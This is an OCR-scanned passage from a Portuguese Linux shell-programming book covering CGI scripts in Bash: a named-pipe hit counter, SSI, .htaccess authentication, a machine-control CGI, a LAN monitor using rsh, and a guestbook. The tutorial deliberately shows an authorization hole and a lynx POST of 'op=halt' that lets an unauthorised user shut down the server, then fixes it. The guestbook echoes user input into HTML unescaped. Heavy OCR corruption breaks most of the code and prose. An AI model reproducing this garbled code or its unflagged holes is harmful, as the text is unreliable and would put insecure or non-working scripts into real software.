onde name é a variável distro e value é a opção escolhida pelo usuário. 
Um exemplo é: 
distro=Debian 
$ cat radiobuttons.cgi 
W!/bin/bash 
echo "content-type : text/html" 
echo 
VAR•$(seà -n lpl 
echo "SVAR <br>" 
echo " <br>" 
{ "$VAR" ] I I l echo "voce nao gosta de nada";exü; 
echo "Sua distro predileta eh : <b>$(echo SVAR I cut -d= - f2)</b>" 
Contador de acesso genérico 
Um dos primeiros exemplos que vimos foi como fazer um contador de aces-
so contador .cgi. Aquela implementação tem um problema de concorrên-
cia. Se a página tiver dois acessos 'simultâneos' ela pode deixar de conta-
bilizar um acesso. Vamos imaginar que temos dois acessos à página 'ao 
mesmo tempo'. O fluxo de execução do CGI do primeiro acesso executa as 
seguintes linhas: 
ARQ="/tmp/page .hits" 
n="S(cat SARQ 2> /dev/null) " I 1 n•O 
O kerne/ interrompe a execução do CGI nesse momento e começa a exe-
cutar o CGI do segundo acesso à página. O segundo CGI é todo executado; 
assim, ele leu o valor que tinha no arquivo /tmp/page .hits, somou 1 e 
sobrescreveu o arquivo com o novo valor. Agora o kemel volta a executar o 
primeiro CGI de onde parou. Seguindo nosso algoritmo, o CGI já tem o valor 
antigo do arqu!vo na variável n, assim ele vai para a próxima instrução: 
echo $ ( (n=n+ l)) > "$!\RQ" 
Sobrescreveu o antigo valor. Note: como ele foi interrompido antes da 
segunda execução do CGI, ele estava com o valor antigo em n . Nosso 
contador perdeu um acesso. 
434 Programação Shell Linux 
Para arrumar esse problema, vamos aproveitar e incluir um novo tópico aqui. 
SSI - Server Side lncludes 
SSI são diretivas que colocamos em uma página html pura para que o ser-
vidor avalie quando a página for acessada. Assim podemos adicionar con-
teúdo dinâmico á página sem precisarmos escrevê-la toda em CGI. Para 
isso basta configurar o seu Apache corretamente. Quem fornece essa op-
ção é o módulo includes (mod includel , simplesmente descomentamos 
a linha que carrega esse módulo: 
LoadModule includes_module /usr/lib/apache/1 .3/mod_include.so 
Existem duas maneiras de configurá-lo: 
1. Através da extensão do arquivo, normalmente .shtml 
2. Através da opção XBitHack. Esta opção testa se o arquivo html 
( . htmll requisitado, tem o bit de execução ligado, se tiver ele exe-
cutará o que estiver usando as suas diretivas. Acrescente a seguinte 
linha em seu httpd.conf. 
XBitHack on 
Em ambos os casos o arquivo html precisa ser executável. 
Este tópico está muito bem documentado nos seguintes endereços: 
http ://httpd. apache. org/docs/howto/ssi. htm I 
http://httpd.apache.org/docs/mod/mod_include.html 
Contador 
Para resolver o problema de concorrência vamos utilizar um named pipe. 
Criamos o seguinte script, que será o daemon que receberá todos os pe-
didos para incrementar o contador. Note que ele vai ser usado por qualquer 
página no nosso site que precise de um contador. 
$ cat daemon_contador .eh 
1!/bin/bash 
PIPE•"/tmp/pipe_contador" 
1 arquivo named pipe 
f dir onde serao colocados os arquivos contadores 
I de cada pagina 
DIR•" /v ar twww/contador •• 
( -p "SPIPE" ] 11 mkHfo "SP•PE" 
while : 
do 
for URL in $(cat < SPIPE); do 
rtLE=''$DIR/$ (echo SURL I sed ' s .. •t .. ' )" 
CGI em Shell Scrípt 
435 
~ quando rodar como daemon comente a proxima linha 
echo "arquivo ~ SFILE" 
n• "S (cat snu: 2> dev nulll • 
n•O 
echo S((n•n•l)) > "SFILE" 
done 
done 
Como só esse script altera os arquivos, não existe problema de concor-
rência. 
Esse script será um daemon, isto é, rodará em background. Quando uma 
página sofrer um acesso, ela escreverá a sua URL no arquivo de pipe. 
Para torná-lo um daemon execute-o em background, assim: 
$ nohup daemon_contador .sh & 
e em seguida dê exit na sua seção. O processo que estava 
associado ao terminal ficará sem pai e será adotado pelo 
in:.t . 
Para testar, execute este comando: 
$ echo "teste_pagina .html " > /tmp/pipe_contador 
Em cada página que quisermos adicionar o contador acrescentamos a 
seguinte linha: 
<!--texec cmd~ "echo SREOUEST_uR: > trrp/pipe_contador"--> 
436 Programação Shell Linux 
Note que a variável $ REQUEST_URI contém o nome do arquivo que o na-
vegador requisitou. 
Se você ainda não entendeu, tem grande chance de ser devido a não ter 
compreendido o mecanismo de funcionamento dos named-pipes. Isto está 
mais esmiuçado no capítulo 8 deste livro. Confira! 
Segurança 
Introdução e Configuração 
Este é um tópico importante quando falamos sobre CGis, principalmente 
os que têm algum tipo de interação com o usuário. Mas para aumen-
tar um pouco a segurança de nossos CGis, podemos utilizar a opção 
J\ccessrileName do Apache. Ela nos permite especificar quais usuários 
terão acesso a um determinado diretório. Por exemplo, podemos espe-
cificar quais usuários terão acesso aos scripts em http:/1/ocalhostlcgi-bin/ 
controle/ 
Primeiro vamos configurar o Apache. Procure e, se for o caso, desce-
mente a seguinte linha em seu httpd . conf : 
.~ccessFi leNarr..e . htaccess 
Essa opção define para o Apache o nome do arquivo que terá as 
informações sobre o controle de acesso de cada diretório. Procure e, 
se for o caso, descomente as seguintes linhas para não deixar nenhum 
usuário baixar nossos arquivos de controle de acesso e de usuários e 
senhas. 
<Fil es -
"A\ .ht "> 
Orcler allow,deny 
Deny ftom all 
</f'i les> 
Este próximo passo é necessário porque normalmente a opção 
JUlo"'oveeriáe de.Eaul t é None . Assim, para cada diretório que você dese-
ja ter esse controle, adicione as seguintes linhas em seu httpd . conf: 
<Directory /di.reto.rio/que/tera/htaccess/> 
J>.ll oWOvertide i>.uthCon/ig 
</ Directory> 
Mate 
com d re l s 
1 • s 
CGI em Shell Script 
437 
Agora que temos o nosso Apache configurado, vamos configurar o nos-
so . htaccess . Este arquivo tem a seguinte estrutura: 
AuthName "Acesso Restrito" 
AuthType Basic 
AuthUserFile /PATH/TO/ .hcpasswd 
require valid-user 
Onde: 
AuthName 
AuthType 
AuthUserFile 
require valid- user 
-
mensagem que irá aparecer quando pedir o 
username e passwd; 
- normalmente é Basic; 
- o PATH para o arquivo que contém a lista de 
usuário e senha válido; 
- especifica que somente usuários válidos terão 
acesso. 
Vamos a um exemplo. Vamos supor que queremos proteger o acesso ao 
diretório /usr/lib/cgi- bin/controle. Configuramos o httpd .conf como 
descrito acima. Depois criamos o seguinte arquivo nesse diretório. 
AuthName 
11Acesso Restrit0
11 
AuthType Basic 
AuthUserFile /usr/lib/cgi -bin/controle/ .htpasswd 
require valid-user 
Feito isso, criamos o nosso arquivo com os usuários válidos. Importante: 
os usuários que vamos criar não precisam existir na máquina, isto é, não 
têm nenhuma relação com o arquivo /etc/pass ,~d . Para criar o arquivo 
utilizamos o comando: 
$ htpasswd -m -c ./. htpasswd user 
Após criarmos e adicionarmos o primeiro usuário, basta tirar a opção -c 
do comando para adicionar novos usuários no mesmo arquivo. Exemplo: 
$ htpasswd -m ./. htpasswd outro_user 
438 Programação Shell Unux 
Obs.: a cada execução do comando aparecerá um prompt pedindo para definir 
uma senha para o usuário. A opção -m serve para utilizar o algoritmo MOS 
modificado pelo Apache. Mais detalhes: man htpasswd 
Tá, e daí? Onde está o CGI em Shell? 
Calma, isso que vimos é Apache puro. Mas agora vem o pulo do gato 
: 1 Vamos continuar nosso exemplo. Crie o seguinte arquivo e coloque 
em /usr/lib/cgi-bin/controle 
$ cat set.cgi 
t!/bin/bash 
echo "content- type : text/plain " 
echo 
set 
Depois acesse http://localhostlcgi-binlcontrolelset.cgi. Se tudo ocorreu 
bem, aparecerá uma tela pedindo usuário e senha. Entre com um usuário 
e senha que você cadastrou em . /h~:passwd . Serão mostradas todas as 
variáveis de ambiente. Dê uma olhada na variável REMOTE usER. É o nome 
do usuário que fez o login. Agora podemos ter CGis onde só determinados 
usuários podem acessar e, dentre esses usuários, só alguns terão acesso 
a certas opções do script, etc. 
Um exemplo: vamos imaginar que só determinados usuários têm acesso 
ao CGI de controle sobre a máquina. Então configuramos o Apache, cria-
mos o . htaccess e cadastramos os usuários válidos em . htpasswct, isso 
no diretório /usr/lib/cgi-bin/controle 
Criamos o nosso script de controle: 
$ cat controle.cgi 
i!/bin/bash 
echo "content-type: text/htcml '' 
echo 
echo "<html><head><title>Controle</title></head>" 
echo "<body>" 
echo "Voce esta legado como usuario : <b>SREMOTE_USER</b><br>" 
echo "<form action=\"/cgi-bin/controle/controle_post.cgi\" 
method=\ "POST\">" 
echo "<h3>Qual destas operações voce deseja executar ?</h3>'' 
CGI em Shell Script 
439 
[ "$REHOTE_USER" = "9erente" I && { 
echo "<ínput cype=radío name=op value=halt> Oesli9ar máquina<br>" 
echo "<input type• radio name=op value=reboot> Reinicializar<br> "; 
echo " 
<input typearadio name=op value=w> Ver quem esta lo9ado<br> 
<input type=radio name•op value• df> Ver uso do disco<br> 
<input type=submit value=Enviar> 
</form> 
</body> 
</html>" 
Ok, especificamos que somente o usuário gerente terá acesso às op-
ções de halt e reboot. Criamos o scrípt que tratará este ínput. 
$ cat controle_post.cgi 
§!/bin/bash 
echo "cont:enc- type : text/ html" 
echo 
echo "<html><head><t i tle>Controle</title></head> " 
echo "<body>" 
echo "Voce esta l ogado como usuario : <b>$REMOTE_USER</b><br>" 
op=$(sed ' / . / s/' op• // ' ) 
case "Sop" 
in 
esac 
"hal t " 
echo "desl igando a maquina 
"reboot" 
" w" 
echo "reinicializando a maquina 
; ; 
echo "Usuários logaào :" 
echo "<pre>S(who)</pre>" 
"df" ) 
. ) 
echo "Di sco" 
echo "<pre>$(df -Th)</ pre>" 
i ; 
echo "opcao invalida</ body></ html>" 
ex i c 
echo "</body></ html>" 
440 Programação Shell Linux 
Bom, tudo tranquilo. Script sem problemas? NÃO! 
Pois, se algum usuário olhar o código HTML da página http://loca/host/ 
cgi-binlcontrole/controle.cgi, ele verá os inputs do form. Assim, ele sabe 
que o que é enviado pelo POST no nosso exemplo é op=xx . Ele não enxer-
gará as opções halt e reboot, mas ele perceberá que são comandos e que 
o CGI é para executar alguma instrução sobre a máquina. Então se fizemos 
o seguinte comando: 
$ echo "op=halt" 1 lynx -dlllllp -post-data \ 
> -auth=user:senha http: //localhost/ cgi-bin/\ 
> controle/controle_post .cgi 
No user:senha, coloque um use r e senha válido, mas use um user dife-
rente de gerente. 
Note que estamos indo direto à segunda página controle_po::.t .cgi. O 
lynx, para quem não sabe, é um navegador modo texto. No exemplo, ele 
está enviando os dados que recebeu da entrada padrão via o método POST 
para aquela URL. 
Como no script controle_post .cgi não existe nenhum controle de usuá-
rio, o nosso usuário, que no caso é diferente de gerente, conseguiu desligar 
a nossa máquina. :c 
Então vamos arrumar: 
$ cat controle_post .egi 
1! /bln/bash 
eeho "content-type: text/html" 
echo 
eeho "<html><head><title>Controle</title></head>" 
echo "<body>" 
echo "Voce es1:a logado co:no uscario : <b>SREM07E_USE:R</b><br>" 
op•S(sed ' / ./s/"op•// ' 1 
case 
"Sop" 
in 
"halt" 1 
[ "SREMOTE_USER" 
"gerente" ) && ( echo "opcao invalida " 
set » "/tmp/CGI halt_ SRE:MOTE_!\DDR" 
echo "</body></ht:nl>"; exlt; J 
echo "desligando a maquina . .. " 
CGI em Shell Script 
441 
"reboot " 
( 
" $ f\.Bl"101'€._US~R" ! ""' 
" 9erent~" ] && { echo "opca.o inva.l l da" 
s~t >> "/t tnp/CG!_reboot_$RBHO·rE_J\..DDR" : 
éS I;\ C: 
"\'1 " 
echo .. </body></html>"; exi t; i 
echo "xeinicializando .a maquina . . . " 
echo nu!5uàrios logado: .. 
ec;ho "<p r:e>$ (-;..;ho) < / p t.e> " 
"df" ) 
' ) 
echo ... OJ.sco" 
echo "<pr e >$(d f -Th}</pr•> " 
echo "opca.o i nvalida</body></hcrnl >" 
exit 
echo "</body></html>" 
Moral da história: quando utilizar interação com o usuário tem que testar 
tudo! Teste, teste, teste. Verifique as opções, variáveis, etc. 
LAN 
Exemplo prático: vamos monitorar os hosts de nossa LAN. Saber quais 
estão ativos, quais não respondem e informações sobre um determinado 
host. Este fonte é apenas uma estrutura básica, mas serve para se ter uma 
ideia do quão poderoso pode ficar um CGI em She/1. Crie os seguintes ar-
quivos em lusrlliblcgi-binllan 
$ cat lan.cgi 
!i !/bin/bash 
echo "content-type : t ext/html " 
echo 
echo "<html>" 
ec ho "<head>" 
echo "<ti t le>l·1onitoramento da .LAJ,I</t.it J.e>" 
i Oescomente as 2 linhas se quiser aut.o ref resh 
fecho "'<meta http- e quiq-\ " refresh\ " \ 
tcont.~nt•\ " lO ; url .. /cgi-bin/lan/l lln .cgi \ ">" 
Mate 
com d re l s 
1 • s 
442 Programação Shell Linux 
echo .. </head>" 
echo " 
<body bgcolor=~~ite> 
<div align=right>llsuario: <b>$REMO'rE_USO:R</b></div> 
<cencer><h2>Máquinas da LAN</h2> 
<form method=\ "post\" action=\ "lan_inf.o .cgi\"> 
<table widthborder=O cellpAdd.i.ng=2> '" 
j drquivo contendo o nome dos host a monitorar 
f'It.E_hosc="host" 
maxcol=4 
numcol=l 
for host in $ (cat "$FILB_host .. I sort -9 -tl -k2 ) 
do 
clone 
$numcol = 1 ] 
&& echo "<tr>" 
# depedendo da versao do ping exLste 
fi a opcao -w1 que especifica quantos 
H segundo o ping deve espexar por 
H resposta . coloque -wl para agi l izar 
H o tempo de resposta 
pi ng - cl "$host" > /dev/null 2>&1 
if [ $? - eq O );the n 
echo "<td align=\"center\">&nbsp; &nbsp; &nbsp: \ 
<img src• \ " /icons/penguin_on.jpg\" \ 
alt• \ "$host OK\" border• O></a></td>" 
~cho "<td><input type~rddio na~~ho~t\ 
valué=\"$host\"><br>$host:</&d>" 
é l if [ S? - eq 1 J ; then 
echo "<td align=\ "center\">&nbsp: &nbsp:&nbsp;\ 
<img src=\"/icons/penguin_otf . jpg\" \ 
a lt=\"Sem reposta de $host\" \ 
border=O></a>\</td>" 
echo .. <td><br>$ host < /td> •• 
e l if [ $? -eq 2 l ;th en 
fi 
echo " <td a lign=\"çenter\">&n.bsp; &nbsp; &nbsp; \ 
<img src=\" I icons/penguin_off . j pg\ "\ 
alt =\"$host. nao existe\" border=O></a></td>"' 
echo "<td><br>Shost</td>" 
$numcol = 4 J && 
{ echo "</tr>'"; numcol=li 
~ \ 
I I numcol=$ ( !SnumcoHl) ) 
echo 
<lt<1.bl e><br> 
~1atcria com d r bs auto a.~s 
CGI em Shell Scrlpt 
443 
<input type:submit name=\"botao\" 
value•\" i nfo\ "> &nbsp; &nbsp; &nb ::~p; 
<i nput type•submit name•\"botao\" 
valuc• \ "pr oces!JO$\ "> &nbsp; &nbsp; &nbsp; 
</form> 
</cent.e.r> 
</body></html>" 
A seguir, o script que receberá os pedidos da página principal. Para bus-
car informações nos outros hosts estou utilizando um rsh. Você também 
pode utilizar ssh, é só trocar. 
$ c a t lan_i nfo .cgi 
11 ! / b i n /bash 
echo "content-type : text/html " 
echo 
echo "<html> 
<head> 
<title>11onitorame nto da LAN</title></head> 
<body bgcolor =white> 
<di V aliqn=right>Usu.!rio : <b >$ REJ10TE_USSR</b></di v>" 
VAR•${sed -n 'lp' ) 
hos-o=S {echo "SVAR" I sed 's/'host=\{ .'\)\& . *H\1/' ) 
bot ao=S(echo "SVAR" 1 c ut - d = - f3) 
"$host " -d "$bo t dO"] 11 
( echo ''Opcao invalida</bod y></html> ., ;e;.:it; 
if 1 "Sbotao" = " info" ] 
then 
lp=S(pin(] - cl "Shost " 
2> /dev/nuli 1 
sed - n ' /'ii>ING/(s/' . '(\( ( 0-9\ . ]\+\)) :. *S/\l/;p; ) ') 
echo " <cent er><h2>In fo.rma.coe~ da maqui na : \ 
<i>$host</i></h2></center> ~ 
echo 
" <s~rong>N'one : </st rong> $host<br>" 
echo ••<strong>IP: </strong> 
ecbo •'<br>'' 
$i p<br>•• 
saida•S {.rsh .. Shost" cat /proc/ver.s ion) 
( "$ '?" - eq "O" ) && echo "<strong>Si s t ema Operacional</ 
scrong><pre>$saida</pre> " 
s~idae ${ rsh "$host" up t im~) 
( " $?" -eq "O" ) && 
~1atcria com d r bs auto a.~s 
444 Programação Shell Linux 
echo .. <s t rong>tlptuue< I s t rong><pre>$sai da</ p:ce>" 
saidao$ ( rsh "Shost" cat / proc/cpuinío) 
[ ".$?"' -eq " O" } && echo .. <stronq>\ 
rnfoz:macoes ela C PU</.strong><pre>$sa~da</pre> " 
saidaoS ( rsh "Shost• frce - ok) 
( .. $?•' - eq '' O'" } && t:cho .. <st.ron<;> \ 
I nfo;:macocs de t.Scmoz: ic.l</stz::onq><p r e>$saidu</pre>" 
mem;$ ( rsh $host cat / p t:oc/meminfo} 
per:ce:-: t = e cho " $mem•• I s ed - n ' 2p ' 
• wk ' lprintf (" ld " ,$3•!00/$2)} ' 
used~$ ( e cho "Spercent"2 " I bc) 
free•$ (echo ~ zoo-spercent'z · 1 bc) 
echo ·• 
<t.abl e border •O cellspacin950 cel l padding•2> 
<t.r> 
<~d>< font. si ze=\ "3 \ '">0<: </font></t:d> 
<c.d ,align=center t.:id th.:Sused bqcolor=r ed"> 
<f one. size=-\"3\" 
colot =-..:hit.~>$pe:cce nc. </font.></td> 
<t.d \'lidth-$f.rce bgcolo.t=yz:cc n><font sizc ==-\ " 3 \ "> 
&nbsp; <I font></td> 
<td><font. size=\ " 3 \ '' > 100 o:</font></td > 
</tr > 
<ltable>" 
echo ''<br><br><stxong>Detalhes : < /strong>" 
echo ·•<pre>$ (echo "$mem'' I sed '1. Jd ' ) .. 
echo ''<br><b.r></pr..e>" 
echo ''<strong>Int ormacoes de Disco</str ong><br>'' 
echo " Discos SCSI <br>" 
echo ''<pre>$ o:sh '' $host .. cu;. /proc/scsi/ scsi \ 
2> /dev/null)</pre>" 
êcho ,, Oi :-sCO$ 1 DE: <br> '' 
for i in a b c d 
do 
done 
'['E1·1?=$ ( .r.sh " $h os t" "tes ~: - T,. \ 
\ " / pcoc/ .Lde/ hd$i\" &6. 
~cho ~im'' ) 
[ " $TEJ1P" 
~ " s1m" I H 
\ 
echo - n "hdla : $(rsh "Shost" \ 
eat "/proe/ide/hd$1/ (media,rnodel l " 
sed ' N;s/\n/ /')<bx> .. 
echo ''<b z:>Par ticocs d os Discos " 
echo ''<p.re>$ (rsh "$host •• cat. /proc/parcitions) </p.re> •• 
Mate • com d rell s 
IM s 
echo "<pre>S(rsh "Shost" df -Th)</pre>" 
echo "<strong><i>swap</i></strong><pre>\ 
$(rsh "Shost " cat /proc/swaps)</pre>" 
elif I "$botao" = "processos" ) ; then 
saida=S(rsh "Shost " ps aux) 
( ''$?'' -eq ''0'' 
J && echo ''<strong>\ 
Informacoes sobre os processos da \ 
CGJ em Shell Script 
445 
maquina : <i>$host</i></strong><pre>$saida</pre>" 
fi 
echo "</body></html>" 
Você precisa baixar essas duas imagens utilizadas para mostrar se os 
hosts estão respondendo ou não. 
Livro de assinaturas 
E para finalizar, aqui vai um script que faz um livro de assinaturas. Este 
programa pode ser considerado como uma pós-graduação em Shell. Mais 
uma vez obrigado Thobias! 
$ cat visitas .cgi 
11 !/bin/bash 
11 
11 Livro de Visitas 
i Thobias Salazar Trevisan 
i 
11 atualizações : 
I 25/03/2004 - Primeira versão 
* 
* 
#1111111!11#,#N~*i111111wf####i#ii11wwflliiiit1111iwlliifi 411i wiwllititiiiiflfl 
I 
Ui CONFIGS 
N 
f arquivo que conterá todas as mensagens do livro 
I quando criar este arquivo é necessário que ele tenha pelo menos 
i um caractere para podermos utilizar ' sed lr arquivo ' , então 
f use 'echo > Sarq_visita ' 
arq_visita=' /tmp/visitas_meu_site . html ' 
f 
f arquivo temporário para guardar a mensagem vinda do ?OST 
temp_!ile= ' /tmp/visicas_post .txt ' 
11 
446 Programação Shell Linux 
8 diretório para cria r arquivos t empo rários 
temp_dir• '/tmp ' 
11 
i 
di~ccõrio utilizado como loc k pelo scri pc 
é podemos uci l i z.:1r está abordag0m por sabermos que a 
# criação de um diretório é atômica 
di r_lock= ' /unp/loc k_cli retorio_li vro_de_ visitas ' 
M 
# t itulo d a página 
t itulo= 'Livco d e Visitas ' 
i! 
i cores da página 
page_ col o t= ' b l ac k' 
text_color= ' snow ' 
l ink_color= ' l i ghtgreen' 
• 
PJ col oqu e 1 para quando receber uma mensagem no l ivro receber também 
~ uma côpia por email 
SE:ND_MAIL=l 
N emai l que receber á uma cópia 
NAIL= ' meu_em.all ' 
@ 
@ ~*~~H tW HHJHHJWH~ H HH~IIHH#~H I~ HHJ"Hf H~~~HHIHH~DHffHHHD#HH fH fflfH HJ HHj f H 
' ------------------------------------------------------------------
8 mont n o for mulári o p4ra o po.3ca9em de wno nova m~nsa.gem no l iv.ro 
i ------------------------------------------------------------------
mon ca_formulario () { 
local es<ados="AC AL AN AP BA CE DF E:S GO MA MG MS MT PA PS P6 PI PR RJ \ 
RN RO RR RS SC 5 6 SP TO" 
echo '' 
<form method=\ "post\ .. a ction=\ " $ (Oi !I-*' /J \ .,> 
nome: <input typc=\"text\" nüme=\"'nome\" m.:"lxl cngth=\''50\ " 3i%o=\''30\"> 
<p> 
émail: <input. t:ype=\" t éXt\" name =\'•rnai L\"' rnaxlênCfth=\"50\ '' s i 2e=\ "30\"> 
<p> 
cidade : <input type=\ "text\" name=\ "cidade\ " maxlength=\"50\" 
size=\"30\"> 
Es tado : 
<~elect name=\~estado\"> 
<option value~\ " none\" >---
$(for i i n Sestados : do echo \ <opcion val ue=\"Si\ .. \> Si :done} 
</select> 
<p> 
Sua mensagem:<br> 
Mate ria com d r bs a;.Jtora!S 
CGI em Shell SCript 
44 7 
<textarea na:ne•\"mensage:n\" wrap•\ "physical\" rows•\"6\" cols=\"50\"> 
</textarea> 
<p> 
<input type•\"submit\" value•\"Enviar Mensagem\ "> 
<input type•\"reset\ " value•\"Limpar\ "> 
</form> 
i ------------------------------------------------------------------
* adiciona uma nova mensagem no livro 
I ------------------------------------------------------------------
adiciona_msg ()I 
I temp_html arquivo que conterá a mensagem recebia via POST 
t já formatada para o livro de visitas, isto é , em html 
local tem temp_html="Stemp_dir/livro_vuitas temp . html" 
f link de fd 6 com a stdout e redirec~ona a stdout para um arquivo . 
f a partir daqui toda a stdout vai para Stemp_html 
exec 6>&1 ; exec > Stemp_html 
echo "<!--
•••••••••• INÍCIO DA MENSAGEM ••••••==== --> " 
date 
' +\d/~m/ •y
• 
i pega somente o nome 
tem•S(sed -n ' ls/nome•\([A&J •\)& . • /\1/p ' Stemp_filel 
[ "Stem" ) H echo "<b>Stem</b>" 11 echo ' <b>anOnimo</b> ' 
I pega somente o mail 
tem•S(sed -n ' ls/ .·mail•\IIA&) • \)&.•/\1/p' Stemp_íile) 
I "Stem" I && echo "< Stem >" li echo '< none@somewhere >' 
I pega o estado 
sed - n ' 1s/ .•cidade=\([A&J •\)&estado•\((A&) ' \)& .'/(\1 - \2)/p' Stemp_file 
echo "<br> •• 
f imprime a mensagem trocando o final de linha por <BR> 
sed ' ls/ .· &mensagem•//; s/S/<br>/ ' Stemp file 
echo "<hr noshade> 
<!--
········--
FIM DA MENSAGEM •••••••••• --> 
r restaura a stdout e fecha o fd 6 
exec 1>&6 6>&- ; 
I testa se já ex>ste o arquivo com as mensagens 
I - f "Sarq_visita" I 
echo > Sarq_vis~ta I precisamos de pelo menos um 
char 
448 Programação Shell Linux 
8 adiciona a nova mensagem no inicio do arquivo 
( rm -f $arq_visita; sed nlr $temp_html" > $arq_visita 
) < $arq_visita 
tt envi a uma côpia da mensagem recebia para um e -)l\(lil 
[ "$SEND_MAIL" = "1" J H maíl - s 'Li vro da Visitas ' $MAIL < $-cemp_ file 
i ----------- -------------------------------------------------------
f testa se o scr ipt estâ recebendo dados via POST e trata 
i os me-smos se necessário 
. 
------------------------------------------------------------------
testa_post () ( 
i utili=amos um diretório como lock para não sobrescrevermos o arquivo 
I com os dados recebidos via POST enquanto o mesmo está sendo pt:ocessado 
t.rap ' rmdir $(dir_lock : -VARIAVEl.._VAZIAJ >/dev/null 2>&1; return' 1 2 3 15 
Hhile ! mkdir $dir_ l ock >/dev/null 2>&1 ; do sleep l ;done 
i! faz o ur ldecode . copiado com algumas modificações de 
!l hl;t.p ://aurelio.net/sed/programas/unescape. sed 
sed 's/+/ /g ; s/t 40/@/g;s/~ O[Dd] t0 [Aa ] /\ 
/g;s/ %09/ 
/ %22/" /g 
s/, 23/1/g; s/124/$/g; s/126/\l/g:s/\ 27/'\ ' ' /g 
s/~ 28/\(/g;s/%29/\)/g;s/ %28/+/g 
s/%2C/, /g; s/"2F/\//g;s/• 3A/:/g;s/%3B/;/g 
s/% 3C/</g;s/ % 3D/=/g ; s/\3~/>/g 
s/%3F/?/g;s/%5B/[/g; •/%5C/\\/g; s/t 5D/]/g 
s/~ 5E/ '/g ; s/< 60/ . /g ; s/t7B/(/g 
s/% 7C/I/g;s/ ~7D/}/g ; s/ ~7~/-/g : s/%Al/ ; /g 
s/%A2/</g;s/ tA3/f/g ; s/~A4/o/g 
s/, A5/V/g;s/ t A6/:/g; s/l A7/§/g;s/! A8/'"/g 
s/'I,A9/IfJ/g;s/ ~AA/•Jg ; s /'!.AB/«/g 
si• Acf,fq :si ~ADI/g:si%AE/~/q:s/ \AF/-/g 
s/• Bo/'/g;s/ t Bl/±/g;s/t B2/' /g 
s/~B3/ ' /g;s/ %B4/ ' /g ; s/%BS/p/g : s/% B6/~/g 
s/• B7/ ·/g; s/t B8/ , /g:s/ t s9/ 1 /g 
s/~BA/' /g; s/t BB/»/g; s/'OBC/4/g; s /%BD/'->/g 
s/% BE/~/g ; s/ ~BF/ 0/g;s / ?CO/À/g 
s/!Cl/Á/g ; s/ õC2/Â/g;s/~C3/Â/g : s/%C4/A/g 
s/%CS/Â/g ; s/ ~C6/E/g;s/~C7/Ç/g 
s/%c 8/É/g;s/ %C9/É/g;s/1cA/t/g: s/3cs/e/g 
s/~CC/I/g;s/ %CD/Í/g;s/%CE/!/g 
s/~CF/l/g;s/ .DO/D/g; s/%Dl/N/g ; s/ t 02/Ó/g 
s/, D3/0/g;s/t D4/Õ/g; s/t DS/0/g 
s/% D 6/0/g;s/ ~D7/ •/ g ; s/ tD8/0/g ; s/% D9/0/g 
/g; s/ ~21/!/g;s 
Mate ria com d r bs a;.Jtora!S 
s/tOA/Ú'g;s/\08/Ú/g;s/ DC/U/g 
s/\00/Y/g ; s/~OE/~/g ; s/ OF/6/g;s/\EO/à/g 
s/\El/à/g; s/\E2/A/g; s/,E3/3/g 
s/\E4/~/g ; s/ \ E5/â/g ; s/ \ E6/~/g ; s/%E7/ç/g 
s/\E8/e/g; s/%E9/é/g;s/%EA/ê/g 
s/ EB/ê/g;s/%EC/i/g; s/%EO/i/g; s/%EE/l/g 
s/ EF/1/g; s/ FO/~/g; s/,Fl/~/g 
s/ F2/õ/g;s/%F3/ó/g;s/~F4/6/g;s/,FS/õ/g 
s/\F6/0/g;s1 F7/~/g;s/ FS/0/g 
s/\F9/ú/g;s/ FA/ú/g;s/ FB/0/g;s/\FC/u/g 
s/tFO/y/g; s/\FE/p/g; s/ FF /y/g ; sr 25/%/g ' > Stemp _ftle 
N se t.emos 1nput ele está em Stemp_file 
[ -s Stemp_file 1 && adiciona_msg 
~ apaga o nosso diretório de lock 
rmdir "${dir_lock:-VARIAVEL_VAZIAl " 
CGI em Shell Script 
449 
~fttl;·l~rt#~f!iff~ifr••••••,,•&#F•F;~·•~•·~•••f~aa&.aa!i;•&ifft~,f­
~ 
~ ------------------------------------------------------------------
• 
l?rincipal 
. 
------------------------------------------------------------------
echo "content- type: text/html " 
echo 
echo "<html> <head> <title> Stitulo <lt.itle> </head>" 
echo "<body bgcolor=\ "Spage_color\" tex ~•\ " Stex t_co:or\ " link=\ "Slink_ 
color\ ••>" 
echo "<center><hl>Stitulo</hl></center><hr size•6 noshade>" 
monta_formulario 
echo "<hr sizee6 noshade>" 
testa_post 
cat Sarq_visita 
echo "</body>" 
echo "<'html>" 
·Apêndice 4 
Dialog 
Bem-vindo( a) ao "Dialog --tudo", uma documentação com-
pleta do programa Dialog escrita em português. 
O Dialog é um programa usado para desenhar inter-
faces amigáveis para o usuário, com botões e menus, a 
partir de um Shell Script. 
Um Shell Script é um programa feito para funcionar no 
interpretador de comandos (prompt) padrão do UNIX/Linux, 
como o Bourne Shell, ou o Bash. 
Por que este documento existe 
Este documento veio para preencher uma lacuna na do-
cumentação nacional de Software Livre. Apesar de ser 
um programa já anHgo, muito conhecido35 e útil, o Dialog 
nunca teve uma documentação tipo tutorial, que ensinas-
se aos poucos seus conceitos, nem em português, nem 
em inglês. 
Como a procura por um documento como esse sempre 
foi grande, ele existe por causa da demanda. Sua razão 
de existência é a sua prévia inexistência. 
35. O Dialog se destacou por ser o programa usado para instalar o Slackware 
Linux. 
450 
Mate ria com d r bs a;.Jtora!S 
Dialog 
451 
Do autor (meu grande amigo Aurélio Marinho Jargas): 
"Em Junho de 2003, cansado de ver a mesma cena se repetir durante 
anos, resolvi fazer algo para mudar a situação. Há muito tempo participante 
da lista de discussão She/1-script, era muito frequente haver pessoas pro-
curando documentação sobre o Dialog, e fora a que acompanha o progra-
ma (em inglês), simplesmente não havia outra. Espero que este documento 
acabe com essa falta de uma vez por todas." 
Objetivo e Escopo Deste Documento 
O objetivo 
O objetivo principal é que alguém 100% leigo em Dialog possa, ao final da 
leitura deste documento, criar scripts que o utilizem, ou modificar scripts já 
existentes para usarem uma interface em Dialog. 
O escopo 
O escopo é o uso do Dialog. Este documento irá apresentá-lo, ensinar de 
maneira progressiva como ele funciona e prover exemplos e dicas de como 
usufruir de suas características. Basicamente isso envolve: 
-
O que ele pode fazer; 
-
Como ele faz; 
-
Como embuti-lo num script; 
-
Técnicas de navegação entre telas; 
-
Configuração de aparência. 
Pré-requisito 
Do leitor, espera-se um conhecimento prévio de programação em Shell 
Script (Bourne She/1). Os scripts que serão demonstrados aqui são sim-
ples, mas para um leigo em She/1 será difícil aproveitar o conteúdo deste 
documento. Afinal, o Dialog foi feito para trabalhar em conjunto com o 
She/1. 
Mate 
com d r~•los autCYa s 
452 Programação Shell Linux 
Recomendação 
